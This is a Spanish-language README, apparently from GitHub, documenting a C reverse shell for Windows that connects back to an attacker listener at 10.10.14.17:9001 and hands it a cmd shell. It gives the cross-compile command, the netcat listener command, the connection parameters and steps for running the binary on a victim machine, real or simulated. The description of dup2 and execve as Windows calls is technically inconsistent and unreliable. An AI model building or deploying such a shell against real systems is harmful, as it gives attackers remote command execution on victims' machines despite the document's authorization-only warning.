# 🐚 Windows Reverse Shell en C

Este programa en C implementa una **reverse shell** que se conecta a un servidor atacante (listener) a través de TCP y redirige la entrada/salida del sistema a dicho servidor. Está diseñado específicamente para sistemas **Windows**, usando `cmd` como intérprete.

## ⚠️ **Advertencia**

> Esta herramienta debe ser utilizada **exclusivamente en entornos controlados y con autorización explícita**. El uso no autorizado de este tipo de código puede ser **ilegal y punible por ley**.

## 🧠 ¿Qué hace este código?

1. Crea un socket TCP con `socket()`
2. Se conecta a una IP y puerto definidos (`10.10.14.17:9001`)
3. Redirige `stdin`, `stdout` y `stderr` al socket con `dup2()`
4. Ejecuta `cmd` usando `execve()`


## 🧪 Requisitos

- Sistema operativo: Windows
- Compilador compatible (MinGW, x86_64-w64-mingw32-gcc, etc.)
- Listener del lado atacante (por ejemplo: `nc -lvnp 9001`)


## 🔧 Compilación

Usa MinGW para compilarlo en Windows o desde Linux para target Windows:

```bash
x86_64-w64-mingw32-gcc reverse_shell.c -o shell.exe
````

## 🚀 Uso

1. En tu máquina atacante (Kali, Parrot, etc.):

```bash
nc -lvnp 9001
```

2. Ejecuta el binario `shell.exe` en la máquina víctima (simulada o real).

3. Obtendrás una shell inversa con privilegios del proceso.

## ⚙️ Parámetros de conexión

```c
int port = 9001;
revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.17");
```

Cambia estos valores según tu IP y puerto antes de compilar si deseas adaptar la conexión.

## 📦 Archivos

* `reverse_shell.c` – Código fuente principal
* `README.md` – Documentación

## 👨‍💻 Autor

ErickO
🔗 GitHub: [@NoTrustedx](https://github.com/NoTrustedx)

## 📄 Licencia

MIT License – para uso educativo, investigativo y controlado. **No se permite el uso malicioso.**
